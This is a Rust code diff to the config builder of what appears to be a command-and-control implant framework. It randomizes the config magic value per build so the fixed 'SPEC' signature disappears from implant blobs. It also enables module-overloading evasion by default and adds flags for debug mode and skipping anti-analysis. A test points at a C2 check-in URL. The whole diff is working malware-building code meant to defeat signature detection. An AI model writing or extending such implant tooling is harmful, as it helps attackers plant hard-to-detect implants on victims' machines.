@@ -58,6 +58,7 @@ mod config_field {
     pub const PROFILE_BLOB: u8 = 0x87;
     pub const EVASION_FLAGS: u8 = 0x88;
     pub const IMPLANT_PUBKEY: u8 = 0x89;
+    pub const BUILD_FLAGS: u8 = 0x8A;
 }
 
 /// Generate a complete implant config blob.
@@ -70,11 +71,21 @@ mod config_field {
 /// 5. Encrypt the serialized config with ChaCha20-Poly1305.
 /// 6. Return encrypted blob + implant public key.
 /// Evasion feature flags (bitfield serialized into config TLV).
-#[derive(Debug, Clone, Copy, Default)]
+#[derive(Debug, Clone, Copy)]
 pub struct EvasionFlags {
     pub module_overloading: bool,
     pub pdata_registration: bool,
     pub ntcontinue_entry: bool,
+}
+
+impl Default for EvasionFlags {
+    fn default() -> Self {
+        Self {
+            module_overloading: true,
+            pdata_registration: false,
+            ntcontinue_entry: false,
+        }
+    }
 }
 
 impl EvasionFlags {
@@ -94,6 +105,9 @@ impl EvasionFlags {
     }
 }
 
+/// Default config magic used when no per-build magic is provided.
+pub const DEFAULT_CONFIG_MAGIC: u32 = 0x53504543; // "SPEC" little-endian
+
 pub fn generate_config(
     profile: &Profile,
     server_pubkey: &PublicKey,
@@ -109,6 +123,37 @@ pub fn generate_config(
         kill_date,
         EvasionFlags::default(),
         &[],
+        false,
+        false,
+    )
+}
+
+/// Generate a config blob using a per-build randomized config magic value.
+///
+/// The `config_magic` replaces the fixed `0x53504543` ("SPEC") in both the
+/// config blob header and the AAD for AEAD encryption. The implant reads
+/// this magic from its patchable `cfg_magic_marker` region at runtime.
+pub fn generate_config_with_magic(
+    profile: &Profile,
+    server_pubkey: &PublicKey,
+    channels: &[ChannelConfig],
+    sleep_config: &SleepConfig,
+    kill_date: Option<i64>,
+    evasion: EvasionFlags,
+    pic_blob: &[u8],
+    config_magic: u32,
+) -> Result<GeneratedConfig, BuilderError> {
+    generate_config_with_evasion_and_magic(
+        profile,
+        server_pubkey,
+        channels,
+        sleep_config,
+        kill_date,
+        evasion,
+        pic_blob,
+        false,
+        false,
+        config_magic,
     )
 }
 
@@ -120,6 +165,35 @@ pub fn generate_config_with_evasion(
     kill_date: Option<i64>,
     evasion: EvasionFlags,
     pic_blob: &[u8],
+    debug_mode: bool,
+    skip_anti_analysis: bool,
+) -> Result<GeneratedConfig, BuilderError> {
+    generate_config_with_evasion_and_magic(
+        profile,
+        server_pubkey,
+        channels,
+        sleep_config,
+        kill_date,
+        evasion,
+        pic_blob,
+        debug_mode,
+        skip_anti_analysis,
+        DEFAULT_CONFIG_MAGIC,
+    )
+}
+
+/// Inner config generation function that accepts a per-build config magic.
+fn generate_config_with_evasion_and_magic(
+    profile: &Profile,
+    server_pubkey: &PublicKey,
+    channels: &[ChannelConfig],
+    sleep_config: &SleepConfig,
+    kill_date: Option<i64>,
+    evasion: EvasionFlags,
+    pic_blob: &[u8],
+    debug_mode: bool,
+    skip_anti_analysis: bool,
+    config_magic: u32,
 ) -> Result<GeneratedConfig, BuilderError> {
     if channels.is_empty() {
         return Err(BuilderError::Config(
@@ -191,6 +265,18 @@ pub fn generate_config_with_evasion(
         tlv_bytes(&mut plaintext, config_field::EVASION_FLAGS, &[evasion_byte]);
     }
 
+    // Build flags: debug mode, skip anti-analysis (single byte bitfield)
+    let mut build_flags: u8 = 0;
+    if debug_mode {
+        build_flags |= 0x01;
+    }
+    if skip_anti_analysis {
+        build_flags |= 0x02;
+    }
+    if build_flags != 0 {
+        tlv_bytes(&mut plaintext, config_field::BUILD_FLAGS, &[build_flags]);
+    }
+
     // 4. Derive encryption key.
     // The implant derives its key from SHA256(first 64 bytes of PIC blob).
     // If we have the PIC blob, use the same derivation so the implant can decrypt.
@@ -211,9 +297,11 @@ pub fn generate_config_with_evasion(
 
     // AAD = magic + version (first 8 bytes of CONFIG_BLOB_HEADER).
     // The implant passes these as additional authenticated data during decryption.
+    // When config_magic is per-build randomized, the implant reads it from
+    // the patchable cfg_magic_marker region to construct the same AAD.
     let mut aad = [0u8; 8];
-    aad[..4].copy_from_slice(&0x53504543u32.to_le_bytes()); // CONFIG_MAGIC
-    aad[4..8].copy_from_slice(&1u32.to_le_bytes());          // CONFIG_VERSION
+    aad[..4].copy_from_slice(&config_magic.to_le_bytes());
+    aad[4..8].copy_from_slice(&1u32.to_le_bytes()); // CONFIG_VERSION
 
     use chacha20poly1305::aead::Payload;
     let ciphertext_with_tag = cipher
@@ -230,7 +318,7 @@ pub fn generate_config_with_evasion(
     // [magic: u32 LE][version: u32 LE][data_size: u32 LE][nonce: 12][tag: 16][ciphertext]
     let data_size = ciphertext.len() as u32;
     let mut config_blob = Vec::with_capacity(4 + 4 + 4 + 12 + 16 + ciphertext.len());
-    config_blob.extend_from_slice(&0x53504543u32.to_le_bytes()); // CONFIG_MAGIC "SPEC"
+    config_blob.extend_from_slice(&config_magic.to_le_bytes()); // CONFIG_MAGIC (per-build)
     config_blob.extend_from_slice(&1u32.to_le_bytes()); // CONFIG_VERSION
     config_blob.extend_from_slice(&data_size.to_le_bytes()); // data_size
     config_blob.extend_from_slice(&nonce_bytes); // nonce (12 bytes)
@@ -431,5 +519,40 @@ transform:
 
         let result = generate_config(&profile, &pubkey, &[], &SleepConfig::default(), None);
         assert!(result.is_err());
+    }
+
+    #[test]
+    fn test_generate_config_with_custom_magic() {
+        let profile = test_profile();
+        let (_secret, pubkey) = test_server_keypair();
+        let channels = vec![ChannelConfig {
+            kind: "https".into(),
+            address: "https://c2.example.com/api/checkin".into(),
+        }];
+
+        let custom_magic: u32 = 0xDEADBEEF;
+        let result = generate_config_with_magic(
+            &profile,
+            &pubkey,
+            &channels,
+            &SleepConfig::default(),
+            None,
+            EvasionFlags::default(),
+            &[],
+            custom_magic,
+        )
+        .expect("config generation with custom magic should succeed");
+
+        // Config blob header should start with custom magic
+        let blob = &result.config_blob;
+        let magic = u32::from_le_bytes([blob[0], blob[1], blob[2], blob[3]]);
+        assert_eq!(magic, custom_magic, "CONFIG_MAGIC should be custom value");
+
+        // Version should still be 1
+        let version = u32::from_le_bytes([blob[4], blob[5], blob[6], blob[7]]);
+        assert_eq!(version, 1);
+
+        // The old magic (0x53504543) should NOT appear in the header
+        assert_ne!(magic, DEFAULT_CONFIG_MAGIC);
     }
 }
